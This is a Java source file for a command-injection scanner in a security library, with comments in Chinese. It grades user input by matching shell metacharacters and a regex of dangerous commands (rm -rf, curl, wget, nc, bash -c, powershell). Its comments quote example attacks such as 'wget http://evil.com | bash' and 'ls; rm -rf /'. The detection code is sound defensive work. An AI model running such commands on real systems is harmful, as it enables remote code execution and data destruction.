package yueyang.vostok.security.command;

import yueyang.vostok.security.VKSecurityCheckResult;
import yueyang.vostok.security.VKSecurityRiskLevel;

import java.util.regex.Pattern;

/**
 * 命令注入检测扫描器。
 *
 * <p>Bug3 fix：危险命令单独出现（无 shell 元字符）时触发 MEDIUM 告警，
 * 修复了原来 {@code wget http://attacker.com} 等单独危险命令完全不报警的漏洞。
 * <p>Perf2 fix：去掉冗余的 {@code toLowerCase()}，Pattern 已含 CASE_INSENSITIVE。
 *
 * <p>告警级别：
 * <ul>
 *   <li>HIGH(9)：危险命令 + shell 元字符组合（最高风险）</li>
 *   <li>MEDIUM(6)：仅 shell 元字符，或仅危险命令单独出现</li>
 * </ul>
 */
public final class VKCommandInjectionScanner {

    /**
     * Shell 元字符：{@code ; & | ` $( \n \r}。
     * 这些字符可用于命令链接或命令替换，是命令注入的关键特征。
     */
    private static final Pattern SHELL_META = Pattern.compile("[;&|`]|\\$\\(|\\n|\\r");

    /**
     * 危险命令模式，匹配常见的可利用命令：
     * rm -rf、curl、wget、nc（netcat）、bash -c、sh -c、powershell。
     * 需要完整词边界，避免误匹配 "recursive"、"curly" 等普通单词。
     */
    private static final Pattern DANGEROUS_CMD = Pattern.compile(
            "\\b(rm\\s+-rf|curl\\s+|wget\\s+|nc\\s+|bash\\s+-c|sh\\s+-c|powershell\\s+)\\b",
            Pattern.CASE_INSENSITIVE);

    private VKCommandInjectionScanner() {
    }

    /**
     * 检测输入中是否存在命令注入风险。
     *
     * @param input 待检测的用户输入
     * @return 检测结果
     */
    public static VKSecurityCheckResult check(String input) {
        if (input == null || input.isBlank()) {
            return VKSecurityCheckResult.safe();
        }

        // Perf2 fix: 直接匹配原始输入（Pattern 已含 CASE_INSENSITIVE），避免分配新 String
        boolean hasDangerous = DANGEROUS_CMD.matcher(input).find();
        boolean hasMeta = SHELL_META.matcher(input).find();

        // 危险命令 + 元字符组合：最高风险（如 wget http://evil.com | bash）
        if (hasDangerous && hasMeta) {
            return VKSecurityCheckResult.unsafe(VKSecurityRiskLevel.HIGH, 9,
                    "Detected dangerous command with shell metacharacters", "cmd-dangerous-combo");
        }
        // 仅 shell 元字符：可能是命令链接注入（如 ls; rm -rf /）
        if (hasMeta) {
            return VKSecurityCheckResult.unsafe(VKSecurityRiskLevel.MEDIUM, 6,
                    "Detected shell metacharacter injection pattern", "cmd-shell-meta");
        }
        // Bug3 fix：危险命令单独出现（无元字符）也应触发告警（如 wget http://attacker.com）
        if (hasDangerous) {
            return VKSecurityCheckResult.unsafe(VKSecurityRiskLevel.MEDIUM, 6,
                    "Detected dangerous command without shell metacharacters", "cmd-dangerous-alone");
        }
        return VKSecurityCheckResult.safe();
    }
}
